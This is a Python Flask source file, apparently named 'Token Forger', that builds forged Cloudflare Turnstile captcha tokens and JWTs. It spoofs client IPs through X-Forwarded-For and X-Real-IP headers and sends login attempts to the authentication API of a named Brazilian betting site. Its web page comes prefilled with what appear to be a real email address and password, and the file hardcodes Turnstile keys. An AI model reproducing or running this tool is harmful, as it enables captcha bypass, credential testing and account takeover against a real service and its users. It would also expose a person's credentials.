# ========== token_forger_railway.py ==========
import jwt
import random
import time
import uuid
import hashlib
import base64
import secrets
import json
import requests
import os
import sys
import logging
from datetime import datetime, timedelta
from typing import Dict, Optional, List, Tuple
from flask import Flask, request, jsonify
from flask_cors import CORS
import threading

# ========== CONFIGURAÇÕES ==========
SITE_KEY = "0x4AAAAAAADmr68KUqpnEKo-9"
SECRET_KEY = "0x4AAAAAAADmr62kWZNpTLxzKtYOYbpw7wzY"

# Configuração de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# ========== FÁBRICA DE IPs FORJADOS ==========
class FabricaIP:
    """Fábrica de IPs forjados realistas."""

    def __init__(self):
        self.used_ips = set()
        self.used_ports = set()

        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1'
        ]

        self.paises = ['BR', 'US', 'EU', 'JP', 'AU', 'CA', 'IN', 'GB', 'DE', 'FR', 'IT', 'ES', 'PT']
        self.isps = ['Claro', 'Vivo', 'TIM', 'OI', 'NET', 'Sky', 'Google', 'Amazon', 'Cloudflare', 'DigitalOcean', 'OVH', 'Azure', 'AWS']

    def gerar_ip(self) -> str:
        first = random.randint(1, 223)
        while first in [0, 10, 127, 169, 172, 192, 224, 255]:
            first = random.randint(1, 223)

        if first == 172:
            second = random.randint(32, 255)
        else:
            second = random.randint(0, 255)

        ip = f"{first}.{second}.{random.randint(0,255)}.{random.randint(1,254)}"

        if ip in self.used_ips:
            return self.gerar_ip()

        self.used_ips.add(ip)
        return ip

    def gerar_porta(self) -> int:
        portas_comuns = [80, 443, 8080, 8443, 3000, 5000, 8000, 9000, 5432, 6379]
        porta = random.choice(portas_comuns) if random.random() < 0.7 else random.randint(1024, 49151)

        if porta in self.used_ports:
            return self.gerar_porta()

        self.used_ports.add(porta)
        return porta

    def gerar_user_agent(self) -> str:
        return random.choice(self.user_agents)

    def gerar_metadata(self) -> Dict:
        return {
            'pais': random.choice(self.paises),
            'isp': random.choice(self.isps),
            'device': random.choice(['Desktop', 'Mobile', 'Tablet']),
            'browser': random.choice(['Chrome', 'Firefox', 'Safari', 'Edge']),
            'os': random.choice(['Windows 10', 'Windows 11', 'macOS', 'Linux', 'iOS', 'Android']),
            'timestamp': datetime.now().isoformat()
        }

# ========== FÁBRICA DE TOKENS ==========
class FabricaTokensForjados:
    def __init__(self, secret_key: str = "chave-secreta-forjada"):
        self.secret_key = secret_key
        self.fabrica_ip = FabricaIP()
        self.tokens_gerados = []
        self.total_gerados = 0
        self.ultimo_token = None

    def criar_token_forjado(self, account_id: Optional[str] = None) -> Dict:
        ip = self.fabrica_ip.gerar_ip()
        porta = self.fabrica_ip.gerar_porta()
        metadata = self.fabrica_ip.gerar_metadata()

        if not account_id:
            account_id = f"0x{''.join(random.choices('0123456789ABCDEF', k=16))}"

        agora = int(time.time())
        expiracao = agora + random.randint(1800, 7200)

        payload = {
            "account_id": account_id,
            "forged_ip": ip,
            "forged_port": porta,
            "iat": agora,
            "exp": expiracao,
            "jti": str(uuid.uuid4()),
            "metadata": metadata,
            "session_id": f"session_{random.randint(1000, 9999)}",
            "request_id": str(uuid.uuid4())[:8],
            "version": "1.0.0",
            "type": "forged"
        }

        token = jwt.encode(payload, self.secret_key, algorithm="HS256")

        token_info = {
            'token': token,
            'forged_ip': ip,
            'forged_port': porta,
            'expires_in': expiracao - agora,
            'metadata': metadata,
            'account_id': account_id,
            'timestamp': datetime.now().isoformat()
        }

        self.tokens_gerados.append(token_info)
        self.total_gerados += 1
        self.ultimo_token = token_info
        
        if len(self.tokens_gerados) > 100:
            self.tokens_gerados.pop(0)
            
        return token_info

    def criar_turnstile_forjado(self) -> str:
        timestamp = int(time.time())
        nonce = secrets.token_hex(16)
        user_agent = self.fabrica_ip.gerar_user_agent()

        payload = {
            "sitekey": SITE_KEY,
            "timestamp": timestamp,
            "nonce": nonce,
            "user_agent": user_agent,
            "action": "login",
            "cdata": json.dumps({
                "ip": self.fabrica_ip.gerar_ip(),
                "timestamp": timestamp,
                "session": secrets.token_hex(8)
            })
        }

        payload_json = json.dumps(payload, separators=(',', ':'))
        payload_b64 = base64.b64encode(payload_json.encode()).decode()

        signature = hashlib.sha256(
            f"{payload_b64}.{SECRET_KEY}".encode()
        ).hexdigest()[:32]

        final_hash = hashlib.sha256(
            f"{payload_b64}.{signature}".encode()
        ).hexdigest()

        return f"t2:1.{payload_b64}.{signature}.{final_hash}"

    def testar_login(self, email: str, senha: str) -> bool:
        """Testa login com token forjado."""
        turnstile_token = self.criar_turnstile_forjado()
        ip = self.fabrica_ip.gerar_ip()
        user_agent = self.fabrica_ip.gerar_user_agent()

        headers = {
            'X-Forwarded-For': ip,
            'X-Real-IP': ip,
            'User-Agent': user_agent,
            'Content-Type': 'application/json',
            'Origin': 'https://sortenabet.bet.br',
            'Referer': 'https://sortenabet.bet.br/',
            'Accept': 'application/json',
        }

        login_data = {
            "login": email,
            "email": email,
            "password": senha,
            "app_source": "web",
            "captcha_token": turnstile_token
        }

        try:
            response = requests.post(
                'https://sortenabet.bet.br/api/auth/login',
                json=login_data,
                headers=headers,
                timeout=15
            )

            if response.status_code == 200:
                data = response.json()
                if data.get('access_token'):
                    logger.info(f"✅ Login bem-sucedido! IP: {ip}")
                    return True
            return False
        except Exception as e:
            logger.error(f"❌ Erro: {e}")
            return False

# ========== INICIALIZA ==========
fabrica = FabricaTokensForjados()

# ========== THREAD PARA GERAR TOKENS ==========
def auto_generate():
    """Gera tokens automaticamente a cada 30 segundos."""
    while True:
        try:
            time.sleep(30)
            token = fabrica.criar_token_forjado()
            logger.info(f"🔄 Token automático {fabrica.total_gerados} - IP: {token['forged_ip']}")
        except Exception as e:
            logger.error(f"❌ Erro auto: {e}")

thread = threading.Thread(target=auto_generate, daemon=True)
thread.start()

# ========== ROTAS ==========
@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Token Forger - Railway</title>
        <style>
            body { font-family: Arial; background: #0a0a1a; color: #fff; padding: 20px; }
            .container { max-width: 800px; margin: 0 auto; }
            .card { background: rgba(255,255,255,0.05); border-radius: 10px; padding: 20px; margin: 10px 0; border: 1px solid rgba(255,255,255,0.1); }
            .token { background: rgba(0,0,0,0.3); padding: 10px; border-radius: 5px; word-break: break-all; font-size: 12px; }
            button { background: #f7971e; color: #000; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 5px; }
            button:hover { background: #ffd200; }
            .status { color: #4CAF50; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🚀 Token Forger - Railway</h1>
            <div class="card">
                <h2>📊 Status</h2>
                <p>✅ <span class="status">Online 24/7</span></p>
                <p>📌 Tokens gerados: <span id="total">0</span></p>
                <p>📡 IP Atual: <span id="ip">Nenhum</span></p>
            </div>
            <div class="card">
                <h2>🔑 Último Token</h2>
                <div class="token" id="token">Nenhum</div>
                <button onclick="gerar()">🔄 Gerar Token</button>
                <button onclick="copiar()">📋 Copiar</button>
                <button onclick="testar()">🧪 Testar</button>
            </div>
            <div class="card">
                <h2>🧪 Testar Login</h2>
                <input id="email" placeholder="Email" value="gcriste268@gmail.com" style="width:100%;padding:10px;margin:5px 0;border-radius:5px;border:none;">
                <input id="senha" type="password" placeholder="Senha" value="284050" style="width:100%;padding:10px;margin:5px 0;border-radius:5px;border:none;">
                <button onclick="testarLogin()">🚀 Testar Login</button>
                <div id="resultado" style="margin-top:10px;"></div>
            </div>
        </div>
        <script>
            let ultimoToken = '';
            
            async function atualizar() {
                const r = await fetch('/api/status');
                const data = await r.json();
                document.getElementById('total').textContent = data.total || 0;
                document.getElementById('ip').textContent = data.ultimo ? data.ultimo.forged_ip : 'Nenhum';
                if (data.ultimo) {
                    document.getElementById('token').textContent = data.ultimo.token;
                    ultimoToken = data.ultimo.token;
                }
            }
            
            async function gerar() {
                const r = await fetch('/api/generate', { method: 'POST' });
                const data = await r.json();
                if (data.success) {
                    await atualizar();
                    alert('✅ Token gerado!');
                }
            }
            
            async function testar() {
                if (!ultimoToken) { alert('⚠️ Nenhum token'); return; }
                alert('✅ Token: ' + ultimoToken.substring(0, 40) + '...');
            }
            
            async function testarLogin() {
                const email = document.getElementById('email').value;
                const senha = document.getElementById('senha').value;
                const resultado = document.getElementById('resultado');
                resultado.innerHTML = '⏳ Testando...';
                
                const r = await fetch('/api/test-login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, senha })
                });
                const data = await r.json();
                resultado.innerHTML = data.success ? '✅ LOGIN BEM-SUCEDIDO!' : '❌ Login falhou';
                resultado.style.color = data.success ? '#4CAF50' : '#ff6b6b';
            }
            
            function copiar() {
                if (ultimoToken) {
                    navigator.clipboard.writeText(ultimoToken);
                    alert('✅ Copiado!');
                }
            }
            
            setInterval(atualizar, 5000);
            atualizar();
        </script>
    </body>
    </html>
    '''

@app.route('/api/generate', methods=['POST'])
def api_generate():
    token = fabrica.criar_token_forjado()
    return jsonify({
        'success': True,
        'token': token['token'],
        'ip': token['forged_ip'],
        'port': token['forged_port']
    })

@app.route('/api/status', methods=['GET'])
def api_status():
    return jsonify({
        'total': fabrica.total_gerados,
        'ultimo': fabrica.ultimo_token,
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/test-login', methods=['POST'])
def api_test_login():
    data = request.json
    email = data.get('email')
    senha = data.get('senha')
    
    sucesso = fabrica.testar_login(email, senha)
    return jsonify({'success': sucesso})

@app.route('/api/health', methods=['GET'])
def api_health():
    return jsonify({
        'status': 'healthy',
        'total_tokens': fabrica.total_gerados,
        'timestamp': datetime.now().isoformat()
    })

# ========== MAIN ==========
if __name__ == '__main__':
    print("="*80)
    print("🚀 TOKEN FORGER - RAILWAY")
    print("="*80)
    print(f"📌 Gerando tokens com IPs forjados")
    print(f"📡 IP do Railway: 152.55.176.185")
    print("="*80)
    
    # Gera primeiro token
    fabrica.criar_token_forjado()
    
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
